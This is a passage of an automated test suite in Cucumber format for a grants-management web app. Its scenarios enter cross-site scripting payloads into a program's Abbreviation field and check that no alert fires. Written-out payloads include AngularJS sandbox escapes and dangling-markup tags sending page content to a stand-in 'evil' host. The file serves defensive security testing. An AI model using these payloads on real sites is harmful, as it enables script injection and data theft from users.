      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script5} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301580 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script6} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301582 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    And I enter value "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>" into field "fieldAbbreviation__c"
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301585 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script7} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301587 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                          | Field                |
      | <div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301589 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    And I enter value "<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>" into field "fieldAbbreviation__c"
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301590 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script8} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301592 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <link rel=stylesheet href="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301593 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <link rel=icon href="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301595 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | <meta http-equiv="refresh" content="0; http://evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301597 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <img src="//evil?  <image src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301598 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <video><track default src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301599 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <video><source src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301600 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <audio><source src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301601 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <input type=image src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301603 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                        | Field                |
      | <form><button style="width:100%;height:100%" type=submit formaction="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301604 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                               | Field                |
      | <form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301608 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <button form=x style="width:100%;height:100%;"><form id=x action="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301609 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
